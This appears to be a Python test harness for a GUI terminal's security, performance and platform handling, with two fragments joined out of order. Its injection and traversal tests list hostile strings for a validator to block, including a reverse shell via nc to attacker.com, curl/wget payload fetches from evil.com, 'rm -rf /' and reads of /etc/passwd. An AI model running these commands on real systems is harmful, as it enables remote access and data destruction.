        results = {}
        for test_text in unicode_tests:
            try:
                # Test encoding/decoding
                encoded = test_text.encode('utf-8')
                decoded = encoded.decode('utf-8')
                
                # Test file I/O with unicode
                test_file = Path(self.test_dir) / f"unicode_{hash(test_text)}.txt"
                test_file.write_text(test_text, encoding='utf-8')
                read_text = test_file.read_text(encoding='utf-8')
                
                results[test_text] = {
                    "original": test_text,
                    "encoded_length": len(encoded),
                    "decode_success": decoded == test_text,
                    "file_io_success": read_text == test_text
                }
                
                # Cleanup
                test_file.unlink()
                
            except Exception as e:
                results[test_text] = {"error": str(e)}
        
        # Verify at least basic Unicode support works
        assert results["π≈3.14"]["decode_success"], "Basic Unicode math symbols failed"
        
        return results
    
    def test_signal_handling(self) -> Dict[str, Any]:
        """Test signal handling (SIGINT, SIGTERM, etc.)"""
        if sys.platform == 'win32':
            # Windows signal testing is limited
            return {"platform": "windows", "note": "Limited signal support on Windows"}
        
        # Create a long-running process to test signals
        script_content = '''
import signal
import time
import sys

def signal_handler(signum, frame):
    print(f"Received signal {signum}")
    sys.exit(signum)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

print("Process started, waiting for signal...")
try:
    time.sleep(30)  # Wait for signal
    print("Process completed normally")
except KeyboardInterrupt:
    print("KeyboardInterrupt received")
    sys.exit(130)
'''
        
        script_file = Path(self.test_dir) / "signal_test.py"
        script_file.write_text(script_content)
        
        # Start process
        process = subprocess.Popen([
            sys.executable, str(script_file)
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Wait for process to start
        time.sleep(0.5)
        
        # Send SIGINT
        process.send_signal(signal.SIGINT)
        
        # Wait for completion
        stdout, stderr = process.communicate(timeout=5)
        
        return {
            "return_code": process.returncode,
            "stdout": stdout,
            "signal_handled": "Received signal" in stdout,
            "exit_code_correct": process.returncode in [2, 130]  # SIGINT exit codes
        }
    
    def test_environment_variables(self) -> Dict[str, Any]:
        """Test environment variable handling"""
        # Set test environment variables
        test_env = os.environ.copy()
        test_env["TEST_VAR"] = "test_value_12345"
        test_env["UNICODE_VAR"] = "测试变量"
        
        # Test environment variable access
        if sys.platform == 'win32':
            cmd = 'echo %TEST_VAR%'
        else:
            cmd = 'echo $TEST_VAR'
        
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            env=test_env
        )
        
        assert result.returncode == 0
        assert "test_value_12345" in result.stdout
        
        return {
            "env_vars_set": len(test_env),
            "test_var_passed": "test_value_12345" in result.stdout,
            "unicode_env_support": "UNICODE_VAR" in test_env
        }
    
    def test_security_validation(self) -> Dict[str, Any]:
        """Test security validation system"""
        from security_configuration import EnhancedSecurityManager
        
        security_manager = EnhancedSecurityManager()
        
        # Test various commands
        test_commands = [
            ("ls -la", True, "Safe listing command"),
            ("sudo rm -rf /", False, "Dangerous deletion command"),
            ("wget http://malicious.com | bash", False, "Download and execute"),
            ("python script.py", True, "Python execution"),
            ("cd ../../../etc", False, "Path traversal attempt")
        ]
        
        results = {}
        for command, should_allow, description in test_commands:
            allowed, violations, sandbox_config = security_manager.validate_and_execute(
                command=command,
                cwd=self.test_dir,
                env=os.environ.copy(),
                user_id="test_user",
                session_id="test_session"
            )
            
            results[command] = {
                "description": description,
                "expected_allowed": should_allow,
                "actually_allowed": allowed,
                "violations_count": len(violations),
                "test_passed": allowed == should_allow
            }
        
        security_manager.shutdown()
        
        # Verify that dangerous commands are blocked
        dangerous_blocked = all(not results[cmd]["actually_allowed"] 
                              for cmd, should_allow, _ in test_commands 
                              if not should_allow)
        
        assert dangerous_blocked, "Some dangerous commands were not blocked"
        
        return results
    
    def test_command_injection(self) -> Dict[str, Any]:
        """Test command injection prevention"""
        injection_attempts = [
            "ls; rm -rf /",
            "echo test && rm important_file",
            "cat file | sh",
            "$(wget malicious.com/script)",
            "`curl evil.com/payload`",
            "test; nc -e /bin/bash attacker.com 4444"
        ]
        
        from security_configuration import EnhancedSecurityManager
        security_manager = EnhancedSecurityManager()
        
        results = {}
        blocked_count = 0
        
        for command in injection_attempts:
            allowed, violations, _ = security_manager.validate_and_execute(
                command=command,
                cwd=self.test_dir,
                env=os.environ.copy()
            )
            
            if not allowed:
                blocked_count += 1
            
            results[command] = {
                "allowed": allowed,
                "violations": len(violations),
                "blocked": not allowed
            }
        
        security_manager.shutdown()
        
        # At least 80% of injection attempts should be blocked
        block_rate = blocked_count / len(injection_attempts)
        assert block_rate >= 0.8, f"Insufficient injection blocking rate: {block_rate:.2%}"
        
        return {
            "total_attempts": len(injection_attempts),
            "blocked_count": blocked_count,
            "block_rate": block_rate,
            "results": results
        }
    
    def test_path_traversal(self) -> Dict[str, Any]:
        """Test path traversal prevention"""
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "file:///etc/passwd"
        ]
        
        from security_configuration import EnhancedSecurityManager
        security_manager = EnhancedSecurityManager()
        
        results = {}
        blocked_count = 0
        
        for path in traversal_attempts:
            command = f"cat {path}"
            allowed, violations, _ = security_manager.validate_and_execute(
                command=command,
                cwd=self.test_dir,
                env=os.environ.copy()
            )
            
            if not allowed:
                blocked_count += 1
            
            results[path] = {
                "command": command,
                "allowed": allowed,
                "violations": len(violations)
            }
        
        security_manager.shutdown()
        
        # All traversal attempts should be blocked
        assert blocked_count == len(traversal_attempts), "Some path traversal attempts were not blocked"
        
        return {
            "total_attempts": len(traversal_attempts),
            "blocked_count": blocked_count,
            "all_blocked": blocked_count == len(traversal_attempts)
        }
    
    def test_resource_limits(self) -> Dict[str, Any]:
        """Test resource limit enforcement"""
        # Create memory-intensive script
        memory_script = '''
import sys
import time

# Allocate memory gradually
data = []
for i in range(1000):
    # Allocate 1MB chunks
    chunk = b'x' * (1024 * 1024)
    data.append(chunk)
    time.sleep(0.01)
    if i % 100 == 0:
        print(f"Allocated {i}MB")

print("Memory allocation completed")
'''
        
        script_file = Path(self.test_dir) / "memory_test.py"
        script_file.write_text(memory_script)
        
        # Test resource monitoring
        try:
            import psutil
            
            # Start process with monitoring
            process = subprocess.Popen([
                sys.executable, str(script_file)
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Monitor resource usage
            max_memory_mb = 0
            start_time = time.time()
            
            while process.poll() is None:
                try:
                    proc_info = psutil.Process(process.pid)
                    memory_mb = proc_info.memory_info().rss / (1024 * 1024)
                    max_memory_mb = max(max_memory_mb, memory_mb)
                    
                    # Terminate if it uses too much memory (test limit: 100MB)
                    if memory_mb > 100:
                        process.terminate()
                        break
                    
                    # Timeout after 10 seconds
                    if time.time() - start_time > 10:
                        process.terminate()
                        break
                        
                    time.sleep(0.1)
                    
                except psutil.NoSuchProcess:
                    break
            
            stdout, stderr = process.communicate(timeout=5)
            
            return {
                "max_memory_mb": max_memory_mb,
                "process_terminated": process.returncode != 0,
                "execution_time": time.time() - start_time,
                "memory_limit_enforced": max_memory_mb < 150  # Some tolerance
            }
            
        except ImportError:
            return {"error": "psutil not available for resource monitoring"}
    
    def test_memory_usage(self) -> Dict[str, Any]:
        """Test memory usage of terminal components"""
        try:
            import psutil
            import gc
            
            # Get baseline memory
            process = psutil.Process()
            baseline_memory = process.memory_info().rss / (1024 * 1024)  # MB
            
            # Simulate creating terminal components
            from enhanced_pty_terminal import ANSIProcessor, CommandRequest
            
            # Create multiple components
            processors = []
            requests = []
            
            for i in range(100):
                processor = ANSIProcessor()
                processors.append(processor)
                
                request = CommandRequest(
                    tool="python",
                    args=["-c", f"print('test {i}')"],
                    cwd=self.test_dir,
                    env=os.environ.copy(),
                    command_preview=f"python -c \"print('test {i}')\""
                )
                requests.append(request)
            
            # Measure memory after creation
            after_memory = process.memory_info().rss / (1024 * 1024)
            memory_increase = after_memory - baseline_memory
            
            # Cleanup
            del processors
            del requests
            gc.collect()
            
            # Measure memory after cleanup
            final_memory = process.memory_info().rss / (1024 * 1024)
            memory_freed = after_memory - final_memory
            
            return {
                "baseline_memory_mb": baseline_memory,
                "peak_memory_mb": after_memory,
                "memory_increase_mb": memory_increase,
                "final_memory_mb": final_memory,
                "memory_freed_mb": memory_freed,
                "memory_per_component_kb": (memory_increase * 1024) / 200,  # 100 processors + 100 requests
                "memory_leak_detected": memory_freed < (memory_increase * 0.8)  # Should free at least 80%
            }
            
        except ImportError:
            return {"error": "psutil not available for memory testing"}
    
    def test_cpu_usage(self) -> Dict[str, Any]:
        """Test CPU usage during intensive operations"""
        # Create CPU-intensive script
        cpu_script = '''
import time
import math

start_time = time.time()
iterations = 0

# Run for 2 seconds
while time.time() - start_time < 2:
    # CPU-intensive calculation
    result = math.factorial(100)
    iterations += 1

print(f"Completed {iterations} iterations in {time.time() - start_time:.2f} seconds")
'''
        
        script_file = Path(self.test_dir) / "cpu_test.py"
        script_file.write_text(cpu_script)
        
        try:
            import psutil
            
            # Start process and monitor CPU usage
            process = subprocess.Popen([
                sys.executable, str(script_file)
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            cpu_samples = []
            start_time = time.time()
            
            while process.poll() is None:
                try:
                    proc_info = psutil.Process(process.pid)
                    cpu_percent = proc_info.cpu_percent(interval=0.1)
                    cpu_samples.append(cpu_percent)
                    
                    # Safety timeout
                    if time.time() - start_time > 10:
                        process.terminate()
                        break
                        
                except psutil.NoSuchProcess:
                    break
            
            stdout, stderr = process.communicate(timeout=5)
            
            avg_cpu = sum(cpu_samples) / len(cpu_samples) if cpu_samples else 0
            max_cpu = max(cpu_samples) if cpu_samples else 0
            
            return {
                "average_cpu_percent": avg_cpu,
                "max_cpu_percent": max_cpu,
                "cpu_samples": len(cpu_samples),
                "stdout": stdout.strip(),
                "reasonable_cpu_usage": avg_cpu < 80  # Should not monopolize CPU
            }
            
        except ImportError:
            return {"error": "psutil not available for CPU monitoring"}
    
    def test_io_performance(self) -> Dict[str, Any]:
        """Test I/O performance and handling"""
        # Test file I/O performance
        test_data = "x" * 1024 * 1024  # 1MB of data
        test_file = Path(self.test_dir) / "io_test.txt"
        
        # Write performance test
        write_start = time.time()
        test_file.write_text(test_data)
        write_time = time.time() - write_start
        
        # Read performance test
        read_start = time.time()
        read_data = test_file.read_text()
        read_time = time.time() - read_start
        
        # Verify data integrity
        data_correct = read_data == test_data
        
        # Test binary I/O
        binary_data = b'\x00' * (1024 * 1024)  # 1MB binary data
        binary_file = Path(self.test_dir) / "binary_test.bin"
        
        binary_write_start = time.time()
        binary_file.write_bytes(binary_data)
        binary_write_time = time.time() - binary_write_start
        
        binary_read_start = time.time()
        read_binary_data = binary_file.read_bytes()
        binary_read_time = time.time() - binary_read_start
        
        # Cleanup
        test_file.unlink()
        binary_file.unlink()
        
        return {
            "text_write_time_sec": write_time,
            "text_read_time_sec": read_time,
            "text_write_speed_mbps": 1.0 / write_time if write_time > 0 else float('inf'),
            "text_read_speed_mbps": 1.0 / read_time if read_time > 0 else float('inf'),
            "text_data_correct": data_correct,
            "binary_write_time_sec": binary_write_time,
            "binary_read_time_sec": binary_read_time,
            "binary_data_correct": read_binary_data == binary_data,
            "reasonable_performance": write_time < 1.0 and read_time < 1.0
        }
    
    def test_concurrent_execution(self) -> Dict[str, Any]:
        """Test concurrent command execution"""
        # Create multiple concurrent processes
        num_processes = 5
        processes = []
        start_time = time.time()
        
        for i in range(num_processes):
            if sys.platform == 'win32':
                cmd = f'timeout 1 >nul && echo "Process {i} completed"'
            else:
                cmd = f'sleep 1 && echo "Process {i} completed"'
            
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            processes.append((i, process))
        
        # Wait for all processes to complete
        results = []
        for i, process in processes:
            stdout, stderr = process.communicate(timeout=10)
            results.append({
                "process_id": i,
                "return_code": process.returncode,
                "stdout": stdout.strip(),
                "stderr": stderr.strip()
            })
        
        total_time = time.time() - start_time
        
        # Verify concurrent execution (should take ~1 second, not ~5 seconds)
        concurrent_execution = total_time < 3.0  # Allow some overhead
        all_successful = all(r["return_code"] == 0 for r in results)
        
        return {
            "num_processes": num_processes,
            "total_execution_time": total_time,
            "concurrent_execution": concurrent_execution,
            "all_processes_successful": all_successful,
            "results": results
        }
    
    def test_cross_platform_commands(self) -> Dict[str, Any]:
        """Test cross-platform command compatibility"""
        if sys.platform == 'win32':
            commands = [
                ("dir", "Directory listing"),
                ("echo Hello", "Echo command"),
                ("cd", "Current directory"),
                ("type nul", "Null output")
            ]
        else:
            commands = [
                ("ls", "Directory listing"),
                ("echo Hello", "Echo command"),
                ("pwd", "Current directory"),
                ("cat /dev/null", "Null output")
            ]
        
        results = {}
        for command, description in commands:
            try:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=5,
                    cwd=self.test_dir
                )
                
                results[command] = {
                    "description": description,
                    "return_code": result.returncode,
                    "stdout_length": len(result.stdout),
                    "stderr_length": len(result.stderr),
                    "success": result.returncode == 0
                }
            except Exception as e:
                results[command] = {
                    "description": description,
                    "error": str(e),
                    "success": False
                }
        
        success_rate = sum(1 for r in results.values() if r.get("success", False)) / len(results)
        
        return {
            "platform": sys.platform,
            "commands_tested": len(commands),
            "success_rate": success_rate,
            "all_successful": success_rate == 1.0,
            "results": results
        }
    
    def test_working_directory(self) -> Dict[str, Any]:
        """Test working directory handling"""
        # Test changing working directory
        original_cwd = os.getcwd()
        
        try:
            # Test directory change
            os.chdir(self.test_dir)
            new_cwd = os.getcwd()
            
            # Test relative path resolution
            test_subdir = Path(self.test_dir) / "subdir"
            test_subdir.mkdir()
            
            os.chdir("subdir")
            subdir_cwd = os.getcwd()
            
            # Test command execution in different directories
            if sys.platform == 'win32':
                result = subprocess.run("cd", shell=True, capture_output=True, text=True)
                current_dir_from_cmd = result.stdout.strip()
            else:
                result = subprocess.run("pwd", shell=True, capture_output=True, text=True)
                current_dir_from_cmd = result.stdout.strip()
            
            return {
                "original_cwd": original_cwd,
                "changed_to_test_dir": str(test_subdir.parent) in new_cwd,
                "changed_to_subdir": "subdir" in subdir_cwd,
                "command_sees_correct_dir": subdir_cwd in current_dir_from_cmd,
                "path_resolution_works": True
            }
            
        finally:
            # Restore original working directory
            os.chdir(original_cwd)
    
    def test_exit_codes(self) -> Dict[str, Any]:
        """Test exit code propagation"""
        test_cases = [
            ("exit 0", 0, "Successful exit"),
            ("exit 1", 1, "Error exit"),
            ("exit 42", 42, "Custom exit code"),
        ]
        
        if sys.platform == 'win32':
            # Windows uses different syntax
            test_cases = [
                ("exit /b 0", 0, "Successful exit"),
                ("exit /b 1", 1, "Error exit"),  
                ("exit /b 42", 42, "Custom exit code"),
            ]
        
        results = {}
        for command, expected_code, description in test_cases:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True
            )
            
            results[command] = {
                "description": description,
                "expected_code": expected_code,
                "actual_code": result.returncode,
                "code_matches": result.returncode == expected_code
            }
        
        all_codes_correct = all(r["code_matches"] for r in results.values())
        
        return {
            "all_exit_codes_correct": all_codes_correct,
            "results": results
        }
    
    def test_terminal_resize(self) -> Dict[str, Any]:
        """Test terminal resize functionality"""
        # This test focuses on the resize logic rather than actual PTY resize
        from enhanced_pty_terminal import EnhancedTerminalWidget
        
        # Mock Qt components for testing
        class MockQTextEdit:
            def __init__(self):
                self.width_val = 800
                self.height_val = 600
                self.font_val = MockFont()
            
            def width(self): return self.width_val
            def height(self): return self.height_val
            def font(self): return self.font_val
        
        class MockFont:
            pass
        
        class MockQFontMetrics:
            def __init__(self, font):
                pass
            def horizontalAdvance(self, char): return 8  # 8 pixels per char
            def height(self): return 16  # 16 pixels per line
        
        # Test terminal size calculations
        mock_terminal = MockQTextEdit()
        
        # Calculate expected terminal size
        char_width = 8
        char_height = 16
        expected_cols = max(1, mock_terminal.width() // char_width)
        expected_rows = max(1, mock_terminal.height() // char_height)
        
        return {
            "terminal_width": mock_terminal.width(),
            "terminal_height": mock_terminal.height(),
            "char_width": char_width,
            "char_height": char_height,
            "calculated_cols": expected_cols,
            "calculated_rows": expected_rows,
            "size_calculation_reasonable": expected_cols > 50 and expected_rows > 20
        }
    
    def test_history_management(self) -> Dict[str, Any]:
        """Test command history management"""
        # Test history functionality
        history_commands = [
            "ls -la",
            "cd /tmp", 
            "python script.py",
            "git status",
            "echo 'hello world'"
        ]
        
        # Mock history widget for testing
        class MockHistory:
            def __init__(self):
                self.history = []
            
            def add_command(self, command):
                if command and command not in self.history:
                    self.history.append(command)
                    if len(self.history) > 100:  # Limit to 100 commands
                        self.history.pop(0)
            
            def clear_history(self):
                self.history.clear()
            
            def get_history(self):
                return self.history.copy()
        
        history = MockHistory()
        
        # Add commands to history
        for cmd in history_commands:
            history.add_command(cmd)
        
        # Test duplicate handling
        history.add_command("ls -la")  # Should not duplicate
        
        # Test history retrieval
        retrieved_history = history.get_history()
        
        # Test history limits
        for i in range(200):
            history.add_command(f"test_command_{i}")
        
        limited_history = history.get_history()
        
        return {
            "commands_added": len(history_commands),
            "history_length": len(retrieved_history),
            "no_duplicates": len(retrieved_history) == len(set(retrieved_history)),
            "contains_expected_commands": all(cmd in retrieved_history for cmd in history_commands),
            "history_limit_enforced": len(limited_history) <= 100,
            "final_history_length": len(limited_history)
        }
    
    def test_configuration_loading(self) -> Dict[str, Any]:
        """Test configuration loading and management"""
        # Create test configuration
        test_config = {
            "security": {
                "level": "strict",
                "allowed_commands": ["ls", "pwd", "echo"],
                "max_execution_time": 60
            },
            "terminal": {
                "font_family": "Monaco",
                "font_size": 12,
                "theme": "dark"
            },
            "gui": {
                "window_width": 1400,
                "window_height": 900,
                "show_history": True
            }
        }
        
        # Write test configuration
        config_file = Path(self.test_dir) / "test_config.json"
        config_file.write_text(json.dumps(test_config, indent=2))
        
        # Test configuration loading
        from enhanced_pty_terminal import ConfigurationManager
        config_manager = ConfigurationManager(str(config_file))
        
        loaded_config = config_manager.config
        
        # Test configuration access
        security_config = config_manager.get_security_config()
        
        return {
            "config_file_created": config_file.exists(),
            "config_loaded_successfully": loaded_config is not None,
            "security_level_correct": loaded_config["security"]["level"] == "strict",
            "terminal_font_correct": loaded_config["terminal"]["font_family"] == "Monaco",
            "gui_dimensions_correct": loaded_config["gui"]["window_width"] == 1400,
            "security_config_created": security_config is not None,
            "allowed_commands_loaded": "ls" in security_config.allowed_commands
        }
    
    def generate_test_report(self) -> Dict[str, Any]:
        """Generate comprehensive test report"""
        total_tests = len(self.test_results)
        passed_tests = len([r for r in self.test_results if r.passed])
        failed_tests = total_tests - passed_tests
        
        success_rate = passed_tests / total_tests if total_tests > 0 else 0
        total_execution_time = sum(r.execution_time for r in self.test_results)
        
        # Categorize results
        categories = {
            "Core Functionality": ["PTY Creation", "Command Execution", "ANSI Processing", "Unicode Support", "Signal Handling", "Environment Variables"],
            "Security": ["Security Validation", "Command Injection Prevention", "Path Traversal Prevention", "Resource Limits"],
            "Performance": ["Memory Usage", "CPU Usage", "I/O Performance", "Concurrent Execution"],
            "Platform Compatibility": ["Cross-Platform Commands", "Working Directory", "Exit Code Propagation"],
            "UI & Integration": ["Terminal Resize", "History Management", "Configuration Loading"]
        }
        
        category_results = {}
        for category, test_names in categories.items():
            category_tests = [r for r in self.test_results if r.test_name in test_names]
            category_passed = len([r for r in category_tests if r.passed])
            category_total = len(category_tests)
            
            category_results[category] = {
                "total": category_total,
                "passed": category_passed,
                "failed": category_total - category_passed,
                "success_rate": category_passed / category_total if category_total > 0 else 0
            }
        
        # Determine overall readiness
        critical_categories = ["Core Functionality", "Security"]
        critical_success = all(category_results[cat]["success_rate"] >= 0.8 for cat in critical_categories if cat in category_results)
        
        overall_readiness = "PRODUCTION_READY" if success_rate >= 0.9 and critical_success else \
                          "DEVELOPMENT_READY" if success_rate >= 0.7 else \
                          "NEEDS_WORK"
        
        return {
            "summary": {
                "total_tests": total_tests,
                "passed_tests": passed_tests,
                "failed_tests": failed_tests,
                "success_rate": success_rate,
                "total_execution_time": total_execution_time,
                "overall_readiness": overall_readiness
            },
            "category_results": category_results,
            "detailed_results": [
                {
                    "test_name": r.test_name,
                    "passed": r.passed,
                    "execution_time": r.execution_time,
                    "error_message": r.error_message,
                    "details": r.details
                }
                for r in self.test_results
            ],
            "recommendations": self._generate_recommendations(),
            "timestamp": time.time()
        }
    
    def _generate_recommendations(self) -> List[str]:
        """Generate recommendations based on test results"""
        recommendations = []
        
        failed_tests = [r for r in self.test_results if not r.passed]
        
        # Analyze failures and generate specific recommendations
        security_failures = [r for r in failed_tests if any(keyword in r.test_name.lower() 
                           for keyword in ['security', 'injection', 'traversal'])]
        
        performance_failures = [r for r in failed_tests if any(keyword in r.test_name.lower() 
                              for keyword in ['memory', 'cpu', 'performance', 'concurrent'])]
        
        platform_failures = [r for r in failed_tests if any(keyword in r.test_name.lower() 
                            for keyword in ['platform', 'cross', 'directory', 'exit'])]
        
        if security_failures:
            recommendations.append("CRITICAL: Address security test failures before production deployment")
            recommendations.append("Review and strengthen security validation and command filtering")
        
        if performance_failures:
            recommendations.append("Optimize performance - implement resource monitoring and limits")
            recommendations.append("Consider implementing process pooling for better concurrency")
        
        if platform_failures:
            recommendations.append("Test thoroughly on target deployment platforms")
            recommendations.append("Implement platform-specific command handling")
        
        # General recommendations based on success rate
        success_rate = len([r for r in self.test_results if r.passed]) / len(self.test_results)
        
        if success_rate < 0.7:
            recommendations.append("Significant issues detected - extensive development needed")
        elif success_rate < 0.9:
            recommendations.append("Minor issues detected - address before production")
        else:
            recommendations.append("System appears ready for production deployment")
        
        if not recommendations:
            recommendations.append("All tests passed - system ready for deployment")
        
        return recommendations


def run_performance_benchmark():
    """Run performance benchmarks"""
    print("Running Performance Benchmarks...")
    
    # Terminal creation benchmark
    start_time = time.time()
    terminals_created = 0
    
    try:
        for i in range(10):
            # Simulate terminal creation
            from enhanced_pty_terminal import CommandRequest
            request = CommandRequest(
                tool="echo",
                args=["test"],
                cwd=os.getcwd(),
                env=os.environ.copy(),
                command_preview="echo test"
            )
            terminals_created += 1
        
        creation_time = time.time() - start_time
        
        print(f"Terminal Creation: {terminals_created} terminals in {creation_time:.3f}s")
        print(f"Average creation time: {(creation_time / terminals_created) * 1000:.1f}ms")
        
    except Exception as e:
        print(f"Terminal creation benchmark failed: {e}")
    
    # Command execution benchmark
    start_time = time.time()
    commands_executed = 0
    
    try:
        for i in range(20):
            result = subprocess.run(
                "echo test",
                shell=True,
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                commands_executed += 1
        
        execution_time = time.time() - start_time
        
        print(f"Command Execution: {commands_executed} commands in {execution_time:.3f}s")
        print(f"Average execution time: {(execution_time / commands_executed) * 1000:.1f}ms")
        
    except Exception as e:
        print(f"Command execution benchmark failed: {e}")


def run_stress_test():
    """Run stress tests"""
    print("Running Stress Tests...")
    
    # Memory stress test
    print("Memory Stress Test...")
    try:
        import psutil
        process = psutil.Process()
        baseline_memory = process.memory_info().rss / (1024 * 1024)
        
        # Create many objects
        objects = []
        for i in range(1000):
            from enhanced_pty_terminal import CommandRequest
            obj = CommandRequest(
                tool="python",
                args=["-c", f"print({i})"],
                cwd=os.getcwd(),
                env=os.environ.copy(),
                command_preview=f"python -c 'print({i})'"
            )
            objects.append(obj)
        
        peak_memory = process.memory_info().rss / (1024 * 1024)
        memory_increase = peak_memory - baseline_memory
        
        print(f"Memory usage: {baseline_memory:.1f}MB -> {peak_memory:.1f}MB (+{memory_increase:.1f}MB)")
        print(f"Memory per object: {(memory_increase * 1024) / len(objects):.1f}KB")
        
        # Cleanup
        del objects
        import gc
        gc.collect()
        
        final_memory = process.memory_info().rss / (1024 * 1024)
        memory_freed = peak_memory - final_memory
        print(f"Memory freed: {memory_freed:.1f}MB ({(memory_freed/memory_increase)*100:.1f}%)")
        
    except ImportError:
        print("psutil not available - skipping memory stress test")
    except Exception as e:
        print(f"Memory stress test failed: {e}")
    
    # Concurrent execution stress test
    print("Concurrent Execution Stress Test...")
    try:
        import threading
        
        results = []
        threads = []
        
        def run_command(cmd_id):
            try:
                result = subprocess.run(
                    f"echo 'Command {cmd_id} executed'",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                results.append((cmd_id, result.returncode == 0))
            except Exception as e:
                results.append((cmd_id, False))
        
        # Start multiple concurrent commands
        start_time = time.time()
        for i in range(50):
            thread = threading.Thread(target=run_command, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join()
        
        execution_time = time.time() - start_time
        successful_commands = len([r for r in results if r[1]])
        
        print(f"Concurrent execution: {successful_commands}/{len(threads)} commands successful")
        print(f"Total time: {execution_time:.3f}s")
        print(f"Commands per second: {len(threads) / execution_time:.1f}")
        
    except Exception as e:
        print(f"Concurrent execution stress test failed: {e}")


def main():
    """Main test runner"""
    print("🧪 Enhanced GUI Terminal - Comprehensive Test Suite")
    print("=" * 60)
    
    # Initialize test harness
    test_harness = TerminalTestHarness()
    
    try:
        # Run comprehensive tests
        report = test_harness.run_all_tests()
        
        # Display results
        print(f"\n📊 TEST RESULTS SUMMARY")
        print("=" * 40)
        print(f"Total Tests: {report['summary']['total_tests']}")
        print(f"Passed: {report['summary']['passed_tests']}")
        print(f"Failed: {report['summary']['failed_tests']}")
        print(f"Success Rate: {report['summary']['success_rate']:.1%}")
        print(f"Execution Time: {report['summary']['total_execution_time']:.3f}s")
        print(f"Overall Readiness: {report['summary']['overall_readiness']}")
        
        # Category breakdown
        print(f"\n📋 CATEGORY BREAKDOWN")
        print("-" * 40)
        for category, results in report['category_results'].items():
            status = "✅" if results['success_rate'] >= 0.8 else "⚠️" if results['success_rate'] >= 0.5 else "❌"
            print(f"{status} {category}: {results['passed']}/{results['total']} ({results['success_rate']:.1%})")
        
        # Failed tests details
        failed_results = [r for r in report['detailed_results'] if not r['passed']]
        if failed_results:
            print(f"\n❌ FAILED TESTS")
            print("-" * 40)
            for result in failed_results:
                print(f"• {result['test_name']}: {result['error_message']}")
        
        # Recommendations
        print(f"\n💡 RECOMMENDATIONS")
        print("-" * 40)
        for i, recommendation in enumerate(report['recommendations'], 1):
            print(f"{i}. {recommendation}")
        
        # Save detailed report
        report_file = Path("test_report.json")
        report_file.write_text(json.dumps(report, indent=2))
        print(f"\n📝 Detailed report saved to: {report_file}")
        
        # Run additional tests if system looks good
        if report['summary']['success_rate'] >= 0.8:
            print(f"\n⚡ RUNNING PERFORMANCE BENCHMARKS")
            print("-" * 40)
            run_performance_benchmark()
            
            print(f"\n🔥 RUNNING STRESS TESTS")
            print("-" * 40)
            run_stress_test()
        
        # Final assessment
        print(f"\n🎯 FINAL ASSESSMENT")
        print("=" * 40)
        
        if report['summary']['overall_readiness'] == "PRODUCTION_READY":
            print("✅ SYSTEM IS READY FOR PRODUCTION DEPLOYMENT")
            print("• All critical tests passed")
            print("• Security validation working")
            print("• Performance within acceptable limits")
            
        elif report['summary']['overall_readiness'] == "DEVELOPMENT_READY":
            print("⚠️  SYSTEM NEEDS MINOR FIXES BEFORE PRODUCTION")
            print("• Core functionality working")
            print("• Some non-critical issues detected")
            print("• Address failed tests before deployment")
            
        else:
            print("❌ SYSTEM NOT READY - SIGNIFICANT DEVELOPMENT NEEDED")
            print("• Critical functionality issues")
            print("• Security concerns detected")
            print("• Extensive testing and fixes required")
        
        return 0 if report['summary']['success_rate'] >= 0.8 else 1
        
    except Exception as e:
        print(f"\n💥 TEST HARNESS ERROR: {e}")
        import traceback
        traceback.print_exc()
        return 2
        
    finally:
        # Cleanup
        test_harness.cleanup_test_environment()


if __name__ == "__main__":
    sys.exit(main())#!/usr/bin/env python3
"""
Comprehensive Testing Suite for Enhanced GUI Terminal
Validates all aspects of the terminal implementation including security, performance, and functionality
"""

import os
import sys
import json
import time
import pytest
import subprocess
import threading
import tempfile
import socket
import signal
import psutil
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from unittest.mock import Mock, patch, MagicMock
import logging

# Set up test logging
logging.basicConfig(level=logging.INFO)
test_logger = logging.getLogger(__name__)

@dataclass
class TestResult:
    """Test result record"""
    test_name: str
    passed: bool
    execution_time: float
    error_message: str = ""
    details: Dict[str, Any] = None

class TerminalTestHarness:
    """Comprehensive terminal testing harness"""
    
    def __init__(self):
        self.test_results: List[TestResult] = []
        self.setup_test_environment()
    
    def setup_test_environment(self):
        """Setup test environment"""
        # Create temporary test directory
        self.test_dir = tempfile.mkdtemp(prefix="gui_terminal_test_")
        self.original_cwd = os.getcwd()
        
        # Create test files
        test_files = {
            "test.txt": "Hello, World!",
            "unicode_test.txt": "π≈3.14 ∑ƒ(x)dx",
            "binary_test.bin": b"\x00\x01\x02\x03\xFF",
            "script.py": "import sys; print('Python script executed')",
            "script.sh": "#!/bin/bash\necho 'Shell script executed'",
        }
        
        for filename, content in test_files.items():
            filepath = Path(self.test_dir) / filename
            if isinstance(content, bytes):
                filepath.write_bytes(content)
            else:
                filepath.write_text(content)
        
        # Make scripts executable
        os.chmod(Path(self.test_dir) / "script.sh", 0o755)
        
        test_logger.info(f"Test environment created: {self.test_dir}")
    
    def cleanup_test_environment(self):
        """Cleanup test environment"""
        import shutil
        try:
            os.chdir(self.original_cwd)
            shutil.rmtree(self.test_dir, ignore_errors=True)
            test_logger.info("Test environment cleaned up")
        except Exception as e:
            test_logger.error(f"Failed to cleanup test environment: {e}")
    
    def run_test(self, test_name: str, test_func: callable) -> TestResult:
        """Run a single test and record results"""
        start_time = time.time()
        test_logger.info(f"Running test: {test_name}")
        
        try:
            result = test_func()
            execution_time = time.time() - start_time
            
            test_result = TestResult(
                test_name=test_name,
                passed=True,
                execution_time=execution_time,
